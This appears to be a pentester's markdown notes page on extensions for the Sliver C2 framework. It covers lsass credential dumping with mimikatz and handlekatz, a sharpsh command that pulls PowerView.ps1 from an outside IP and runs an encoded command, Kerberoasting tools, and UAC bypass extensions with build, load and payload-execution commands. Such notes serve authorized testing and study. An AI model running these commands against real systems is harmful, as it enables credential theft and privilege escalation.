| 🏠 [Home](../../redteam.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|-----------------------------|----------------------|-------------------------|


* [Usefull Extensions](../../red_team/sliver/extensions.md)
    * [charpsh](../../red_team/sliver/extensions.md#charpsh)
    * [inline-execute-assembly](../../red_team/sliver/extensions.md#inline-execute-assembly)
    * [Kerberos tools](../../red_team/sliver/extensions.md#kerberos-tools)

# Usefull Extensions

-   handlekatz: dump lsass

-   mimikatz: what else

## charpsh

    sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZ???SNIP...

## inline-execute-assembly

[inline-execute-assembly](https://github.com/sliverarmory/InlineExecute-Assembly)

    inline-execute-assembly  <local_path_to_file> '<params>'

## Kerberos tools

-   `delegationbof`: enumerate kerberos delegations including kerberoast
    and asreproast

-   `c2tc-kerberoast`: kerberoasting an account (return an ticket that
    need to
    [TicketToHashcat.py](https://github.com/sliverarmory/C2-Tool-Collection/blob/main/BOF/Kerberoast/TicketToHashcat.py))

-   `bof-roast`: (return an ticket that need to
    [apreq2hashcat.py](https://github.com/sliverarmory/BofRoast/blob/main/BofRoast/apreq2hashcat.py))


## UAC
links:
* https://seamlessintelligence.com.au/sliver_2.html
* https://intrusionz3r0.gitbook.io/intrusionz3r0/windows-penetration-testing/defense-enumeration/bypass-av-edr-via-dinvoke-+-sliver
### UAC-BOF-Bonanza
https://intrusionz3r0.gitbook.io/intrusionz3r0/windows-penetration-testing/defense-enumeration/bypass-av-edr-via-dinvoke-+-sliver

* [UAC-BOF-Bonanza](https://github.com/icyguider/UAC-BOF-Bonanza)
```bash
git clone https://github.com/icyguider/UAC-BOF-Bonanza.git
❯ cd UAC-BOF-Bonanza
❯ cp -rp ~/Documents/Tools/UAC-BOF-Bonanza/CmstpElevatedCOM/ ~/.sliver-client/extensions
❯ cd ~/.sliver-client/extensions/CmstpElevatedCOM
❯ make
sliver (KOREAN_JUNKER) > extensions load /home/jubeaz/.sliver-client/extensions/CmstpElevatedCOM
sliver (KOREAN_JUNKER) > armory install coff-loader

CmstpElevatedCOM "c:\users\Jack.Smith\ifrit.exe"
```


### sliver_extension_uac_bypass_cmstp
[sliver_extension_uac_bypass_cmstp](https://github.com/0xb11a1/sliver_extension_uac_bypass_cmstp)

```bash
extensions load /mnt/nfs/jubeaz/dev/windows_weaponize/sliver/uac_bypass_cmstp 
```

extensions install /home/jubeaz/.sliver-client/extensions/jubeaz
extensions load /home/jubeaz/.sliver-client/extensions/jubeaz


https://github.com/tijme/cmstplua-uac-bypass